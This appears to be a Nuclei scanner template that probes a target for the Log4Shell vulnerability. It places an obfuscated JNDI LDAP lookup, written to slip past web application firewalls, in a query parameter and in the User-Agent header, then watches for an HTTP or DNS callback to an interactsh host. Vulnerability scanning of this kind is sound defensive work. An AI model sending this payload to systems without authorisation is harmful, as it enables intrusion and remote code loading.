id: log4j-detect-waf

info:
  name: Log4j WAF Bypass
  author: 0x45DDA458
  severity: info

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?test=${jndi:${lower:l}${lower:d}a${lower:p}://{{interactsh-url}}/a}"
    
    
    headers:
      Host: "{{Host}}"
      User-Agent: "Mozilla ${jndi:${lower:l}${lower:d}a${lower:p}://{{interactsh-url}}/a}"

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"
